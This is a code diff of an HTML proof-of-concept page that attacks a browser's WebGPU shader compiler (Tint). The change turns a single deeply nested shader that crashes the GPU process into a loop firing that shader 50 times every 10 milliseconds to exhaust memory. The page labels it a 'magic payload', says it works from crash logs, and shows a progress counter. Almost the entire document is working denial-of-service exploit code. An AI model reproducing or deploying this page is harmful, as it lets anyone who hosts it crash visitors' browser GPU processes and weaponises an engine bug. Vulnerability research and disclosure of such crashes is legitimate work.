@@ -1,25 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Tint Recursion DoS PoC</title>
+    <title>WebGPU Tint OOM DoS</title>
     <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
-    <h2>Tint AST Recursive Depth DoS</h2>
-    <p>Clicking the button will instantly crash the GPU Process.</p>
-    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
+    <h2>Tint AST Memory Exhaustion PoC</h2>
+    <p>Clicking the button will spam the GPU process. Wait ~30 seconds for the crash.</p>
+    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">START GPU SPAM</button>
+    <div id="status" style="margin-top: 20px;">Waiting...</div>
 
     <script>
-        // We use the exact magic depth (165) discovered in the wild that 
-        // triggers the AST abort state corruption and SIGTRAP.
+        const statusEl = document.getElementById('status');
+
         function buildKillerShader() {
             let mathExpr = "(1.0)";
             const ops = ['+', '-', '*', '/'];
+            const baseStr = "vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x";
             
-            for (let i = 0; i < 165; i++) {
-                // Using the exact payload structure from the crash log
+            // 164 is the exact magic depth from your crash logs
+            for (let i = 0; i < 164; i++) {
                 const op = ops[i % 4]; 
-                mathExpr = `(${mathExpr} ${op} vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
+                mathExpr = `(${mathExpr} ${op} ${baseStr})`;
             }
             return `
                 @vertex fn vs_main() -> @builtin(position) vec4<f32> {
@@ -31,22 +33,36 @@
 
         async function triggerCrash() {
             if (!navigator.gpu) {
-                alert("WebGPU is not supported.");
+                statusEl.innerText = "WebGPU is not supported.";
                 return;
             }
 
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
 
+            statusEl.innerText = "Building the magic payload...";
             const killerWGSL = buildKillerShader();
-            console.log("Sending payload to Tint...");
             
-            try {
-                // This call crashes the GPU Process
-                device.createShaderModule({ code: killerWGSL });
-            } catch (e) {
-                console.log("Caught:", e);
-            }
+            let count = 0;
+            statusEl.innerText = "Spamming GPU Process to trigger SIGTRAP OOM...\nWait for the Aw, Snap!";
+
+            // Fire the exact same shader 50 times every 10 milliseconds.
+            // This forces Tint to repeatedly abort and leak memory until it dies.
+            setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    count++;
+                    try {
+                        device.createShaderModule({ code: killerWGSL });
+                    } catch (e) {
+                        // Ignore frontend JS errors
+                    }
+                }
+                
+                // Update screen every 1000 requests
+                if (count % 1000 === 0) {
+                    statusEl.innerText = `Sent ${count} payloads. GPU RAM filling up...`;
+                }
+            }, 10); 
         }
 
         document.getElementById('crashBtn').addEventListener('click', triggerCrash);
